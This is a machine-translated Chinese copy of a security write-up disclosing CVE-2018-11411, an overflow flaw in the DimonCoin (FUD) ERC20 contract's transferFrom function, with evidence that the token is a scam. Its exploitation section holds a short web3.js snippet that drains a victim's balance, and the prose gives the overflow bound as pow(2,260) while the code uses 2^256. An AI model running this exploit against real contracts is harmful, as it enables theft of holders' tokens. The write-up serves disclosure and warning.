<html>
<head>
<title>DimonCoin(FUD), ERC20 token, allows attackers to steal all victim’s balances (CVE-2018–11411)</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">迪蒙币(FUD)，ERC20代币，允许攻击者窃取所有受害者的余额(CVE-2018–11411)</h1>
<blockquote>原文：<a href="https://medium.com/coinmonks/dimoncoin-fud-erc20-token-allows-attackers-to-steal-all-victims-balances-cve-2018-11411-ba9a320604f9?source=collection_archive---------7-----------------------#2018-05-24">https://medium.com/coinmonks/dimoncoin-fud-erc20-token-allows-attackers-to-steal-all-victims-balances-cve-2018-11411-ba9a320604f9?source=collection_archive---------7-----------------------#2018-05-24</a></blockquote><div><div class="ef hh hi hj hk hl"/><div class="hm hn ho hp hq"><div class=""/><h1 id="2bca" class="iq ir ht bd is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn dt translated">摘要</h1><p id="5393" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl hm dt translated">我发现了一个关于迪蒙币(FUD)的智能合约的漏洞，一个以太坊ERC20令牌(<a class="ae km" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11411" rel="noopener ugc nofollow" target="_blank">CVE-2018–11411</a>)[1]。该漏洞与UselessEthereumToken的漏洞[2，3]完全相同。迪蒙币令牌也有同样易受攻击的功能，即UET令牌中的转移而来的<em class="kn">。因此，攻击者可以通过利用该功能窃取受害者帐户中的所有余额。经过更多的调查，我发现迪蒙币(FUD)是一个骗局。FUD代币有多个智能合约，其中一个已经被甩了。我在不同的合同中发现了漏洞，但还没有被丢弃。在本文中，我将解释漏洞和FUD令牌的细节。</em></p><h1 id="4d8c" class="iq ir ht bd is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn dt translated">细节</h1><p id="cb28" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl hm dt translated">如上所述，该漏洞与UselessEthereumToken(<a class="ae km" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10468" rel="noopener ugc nofollow" target="_blank">CVE-2018–10468</a>)【3】的漏洞相同。如果你看了《<a class="ae km" rel="noopener" href="/coinmonks/uselessethereumtoken-uet-erc20-token-allows-attackers-to-steal-all-victims-balances-543d42ac808e"><em class="kn">【UselessEthereumToken(UET)】，ERC20 token，允许攻击者窃取所有受害者余额(CVE-2018–10468)</em></a>》这篇文章，对理解它会有帮助[2]。</p><figure class="kp kq kr ks fq kt fe ff paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="fe ff ko"><img src="../Images/2abc1bdca59871142542c35d1c1ad824.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ezgay3X7-79Rho7aZscq1g.png"/></div></div><figcaption class="la lb fg fe ff lc ld bd b be z ek">Figure 1. Code of transferFrom function in FUD smart contract</figcaption></figure><p id="25aa" class="pw-post-body-paragraph jo jp ht jq b jr le jt ju jv lf jx jy jz lg kb kc kd lh kf kg kh li kj kk kl hm dt translated">图一。显示了易受攻击的<em class="kn"> transferFrom </em>函数。针对ERC20短地址攻击的验证被移至修饰符<em class="kn"> onlyPayloadSize </em>。这是唯一的变化，其他部分与UET令牌中函数的<em class="kn">转换完全相同。</em></p><p id="41e3" class="pw-post-body-paragraph jo jp ht jq b jr le jt ju jv lf jx jy jz lg kb kc kd lh kf kg kh li kj kk kl hm dt translated">如你所见，红框中的代码是错误的。根据代码，当<code class="eh lj lk ll lm b">balances[_to] + _value</code>溢出时，用户可以转移比地址<code class="eh lj lk ll lm b">_from</code>更多的余额。正确的代码应该如下所示:</p><pre class="kp kq kr ks fq ln lm lo lp aw lq dt"><span id="8b4b" class="lr ir ht lm b fv ls lt l lu lv">bool sufficientFunds = fromBalance <strong class="lm hu">&gt;=</strong> _value;<br/>bool sufficientAllowance = allowance <strong class="lm hu">&gt;=</strong> _value;<br/>bool overflowed = balances[_to] + _value &gt; balances[_to];</span><span id="e2d9" class="lr ir ht lm b fv lw lt l lu lv">if (sufficientFunds &amp;&amp; sufficientAllowance &amp;&amp; <strong class="lm hu">overflowed</strong>) {</span></pre><h2 id="c3d6" class="lr ir ht bd is lx ly lz iw ma mb mc ja jz md me je kd mf mg ji kh mh mi jm mj dt translated">剥削</h2><p id="64cd" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl hm dt translated">攻击者所要做的就是找到一个目标帐户和一个值来引起溢出。如果目标账户余额为<code class="eh lj lk ll lm b">0xaaaa</code>，该值应大于<code class="eh lj lk ll lm b">pow(2,260)-0xaaaa</code>。如果值正好是<code class="eh lj lk ll lm b">pow(2,260)-0xaaaa</code>，那么目标的所有余额都被转移到攻击者的账户。我的漏洞利用代码的一部分如下:</p><pre class="kp kq kr ks fq ln lm lo lp aw lq dt"><span id="ee0e" class="lr ir ht lm b fv ls lt l lu lv">max = web3.utils.toBN('0x10000000000000000000000000000000000000000000000000000000000000000');<br/>v_bal=web3.utils.toBN(await FUD.methods.balanceOf(victim).call());<br/>FUD.methods.transferFrom(attacker, victim, max.sub(v_bal))<br/>           .send({from:attacker, gas:1000000, gasPrice:1});</span></pre><h1 id="dcca" class="iq ir ht bd is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn dt translated">骗局</h1><p id="f1c8" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl hm dt translated">迪蒙币(FUD)已经被认为是一个骗局[4]。有多个FUD令牌的智能合约。我认为开发者创造了几个智能合同来隐藏他们的欺骗。合同中，一个是我找到的漏洞合同[5]，另一个是疑似开发商甩的合同[6]。在倾销合同中，一些账户拥有的代币多于总供应量[7]。</p><figure class="kp kq kr ks fq kt fe ff paragraph-image"><div role="button" tabindex="0" class="ku kv di kw bf kx"><div class="fe ff mk"><img src="../Images/3d3efd8f27fa24b7696919a5c4447369.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lfcqbruBc3W9OML6Q-FaoA.png"/></div></div><figcaption class="la lb fg fe ff lc ld bd b be z ek">Figure 2. All top 10 holders have tokens more than 1000000% of total supply</figcaption></figure><p id="755e" class="pw-post-body-paragraph jo jp ht jq b jr le jt ju jv lf jx jy jz lg kb kc kd lh kf kg kh li kj kk kl hm dt translated">开发人员已经使用这两个合同地址在bitcointalk中公布了FUD令牌[8]。广告文章被翻译成几种语言，并且有6个翻译副本刊登了易受攻击的合同。</p><blockquote class="ml mm mn"><p id="867b" class="jo jp kn jq b jr le jt ju jv lf jx jy mo lg kb kc mp lh kf kg mq li kj kk kl hm dt translated">-斯堪地那维克语/丹麦语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2249616" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2249616</a><br/>-德语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2254901" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2254901</a><br/>-意大利语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2248634.0" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2248634.0</a><br/>-俄语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2255885" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2255885</a><br/>-汉语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2250544" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2250544</a><br/>-韩语:<a class="ae km" href="https://bitcointalk.org/index.php?topic=2292406" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2292406</a></p></blockquote><p id="4c3c" class="pw-post-body-paragraph jo jp ht jq b jr le jt ju jv lf jx jy jz lg kb kc kd lh kf kg kh li kj kk kl hm dt translated">开发商已经拿走了他们的证据。官方网站、Telegram、Twitter和Github页面关闭。只有脸书·佩吉还活着。</p><h1 id="c974" class="iq ir ht bd is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn dt translated">结论</h1><p id="a9b5" class="pw-post-body-paragraph jo jp ht jq b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl hm dt translated">我确信迪蒙币(FUD)是一个骗局。开发人员在没有合理原因的情况下创建了多个合同，一个被丢弃，另一个有漏洞。此外，与开发商的沟通渠道也被取消了。它已经广为人知，这是一个骗局，但仍有一些人进行交易的合同。所以，应该让更多的人知道。交易未经验证的硬币时请小心。</p><h1 id="05c5" class="iq ir ht bd is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn dt translated">参考</h1><ul class=""><li id="da1e" class="mr ms ht jq b jr js jv jw jz mt kd mu kh mv kl mw mx my mz dt translated">[1]<a class="ae km" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11411" rel="noopener ugc nofollow" target="_blank">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11411 </a></li><li id="4a01" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[2]<a class="ae km" rel="noopener" href="/coinmonks/uselessethereumtoken-uet-erc20-token-allows-attackers-to-steal-all-victims-balances-543d42ac808e">https://medium . com/coin monks/uselessethereumtoken-uet-ERC 20-token-allows-attakers-to-steak-all-victims-balances-543d 42 AC 808 e</a></li><li id="ba29" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[3]http://cve.mitre.org/cgi-bin/cvename.cgi?<a class="ae km" href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10468" rel="noopener ugc nofollow" target="_blank">name=CVE-2018-10468 </a></li><li id="2252" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated"><a class="ae km" href="https://bitcointalk.org/index.php?topic=2722276.0" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?topic=2722276.0</a></li><li id="2051" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[5] <a class="ae km" href="https://etherscan.io/token/0xf084d5bc3e35e3d903260267ebd545c49c6013d0" rel="noopener ugc nofollow" target="_blank">https://etherscan.io/token/0xf084d5bc3e35e3d903260267ebd545c49c6013d0 </a></li><li id="0249" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[6] <a class="ae km" href="https://etherscan.io/token/0xDe39E5E5a1B0eEB3Afe717D6d011CaE88D19451e#balances" rel="noopener ugc nofollow" target="_blank">https://etherscan.io/token/0xDe39E5A1B0eEB3Afe717D6d011CaE88D19451e</a></li><li id="ead6" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[7] <a class="ae km" href="https://etherscan.io/token/0xDe39E5E5a1B0eEB3Afe717D6d011CaE88D19451e#balances" rel="noopener ugc nofollow" target="_blank">https://etherscan.io/token/0xDe39E5E5a1B0eEB3Afe717D6d011CaE88D19451e#balances </a></li><li id="7806" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[8] <a class="ae km" href="https://bitcointalk.org/index.php?topic=2247833.0" rel="noopener ugc nofollow" target="_blank">https://bitcointalk.org/index.php?主题:2247833.0 </a></li><li id="427c" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[9] <a class="ae km" href="http://dimoncoin.org/cgi-sys/defaultwebpage.cgi" rel="noopener ugc nofollow" target="_blank">http://dimoncoin.org </a></li><li id="ed15" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[10] <a class="ae km" href="https://t.me/DimonCoinFUDD" rel="noopener ugc nofollow" target="_blank">https://t.me/DimonCoinFUDD </a></li><li id="0e7e" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[11] <a class="ae km" href="https://twitter.com/DimonCoin" rel="noopener ugc nofollow" target="_blank">https://twitter.com/DimonCoin </a></li><li id="667b" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[12] <a class="ae km" href="https://github.com/dimoncoin/DimonCoin" rel="noopener ugc nofollow" target="_blank">https://github.com/dimoncoin/DimonCoin </a></li><li id="e348" class="mr ms ht jq b jr na jv nb jz nc kd nd kh ne kl mw mx my mz dt translated">[13] <a class="ae km" href="https://www.facebook.com/DimonCoin-120112948666326/" rel="noopener ugc nofollow" target="_blank">https://www.facebook.com/DimonCoin-120112948666326/</a></li></ul></div></div>    
</body>
</html>